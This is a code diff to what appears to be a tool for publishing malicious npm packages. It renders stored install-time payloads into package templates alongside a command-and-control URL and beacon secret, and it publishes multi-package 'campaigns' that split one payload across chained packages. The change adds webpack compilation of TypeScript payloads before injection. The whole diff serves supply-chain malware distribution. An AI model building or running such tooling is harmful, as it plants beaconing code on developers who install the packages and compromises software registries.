@@ -77,7 +77,7 @@ export function publishFiles(
 }
 
 /** Publish a monolithic package from the template dir. Existing behavior, now wraps publishFiles. */
-export function publishPackage(
+export async function publishPackage(
   pkgName: string,
   registryUrl: string,
   token: string | null,
@@ -85,11 +85,22 @@ export function publishPackage(
   installJs?: string,
   beaconSecret = '',
   version = '1.0.0',
-): { success: boolean; output: string } {
+  lang: 'js' | 'ts' = 'js',
+): Promise<{ success: boolean; output: string }> {
+  let source = installJs;
+
+  // Compile TS payloads via webpack
+  if (lang === 'ts' && source) {
+    const { compilePayload } = await import('./compiler');
+    const compiled = await compilePayload(source);
+    if (!compiled.success) return { success: false, output: `webpack compilation failed:\n${compiled.output}` };
+    source = compiled.code!;
+  }
+
   const files: Record<string, string> = {};
   for (const file of TEMPLATE_FILES) {
-    const raw = file === 'index.js' && installJs != null
-      ? installJs
+    const raw = file === 'index.js' && source != null
+      ? source
       : fs.readFileSync(path.join(TEMPLATE_DIR, file), 'utf8');
     files[file] = renderTemplate(raw, pkgName, c2Url, beaconSecret, version);
   }
@@ -199,13 +210,13 @@ export function generateCampaignChain(
   };
 }
 
-export function publishCampaign(
+export async function publishCampaign(
   campaignName: string,
   accountId: number,
   depth: number,
   beaconSecret: string,
   payloadId?: number,
-): { success: boolean; packages: { name: string; role: string; status: string; output: string }[]; analysis?: import('./splitter').SplitAnalysis } {
+): Promise<{ success: boolean; packages: { name: string; role: string; status: string; output: string }[]; analysis?: import('./splitter').SplitAnalysis }> {
   const acct = db.prepare('SELECT * FROM accounts WHERE id = ?').get(accountId) as Account | undefined;
   if (!acct) return { success: false, packages: [{ name: '', role: '', status: 'failed', output: 'account not found' }] };
 
@@ -215,11 +226,19 @@ export function publishCampaign(
   let splitFiles: Map<string, string> | undefined; // role → JS source
 
   if (payloadId) {
-    const payload = db.prepare('SELECT install_js FROM payloads WHERE id = ?').get(payloadId) as { install_js: string } | undefined;
+    const payload = db.prepare('SELECT install_js, lang FROM payloads WHERE id = ?').get(payloadId) as { install_js: string; lang: string } | undefined;
     if (!payload) return { success: false, packages: [{ name: '', role: '', status: 'failed', output: 'payload not found' }] };
 
+    let payloadSource = payload.install_js;
+    if (payload.lang === 'ts') {
+      const { compilePayload } = await import('./compiler');
+      const compiled = await compilePayload(payloadSource);
+      if (!compiled.success) return { success: false, packages: [{ name: '', role: '', status: 'failed', output: `webpack compilation failed:\n${compiled.output}` }] };
+      payloadSource = compiled.code!;
+    }
+
     const { splitPayload, capPlaceholders } = require('./splitter') as typeof import('./splitter');
-    splitResult = splitPayload(payload.install_js);
+    splitResult = splitPayload(payloadSource);
     capRoles = splitResult.analysis.found;
     splitFiles = new Map<string, string>();
     for (const cap of splitResult.caps) {
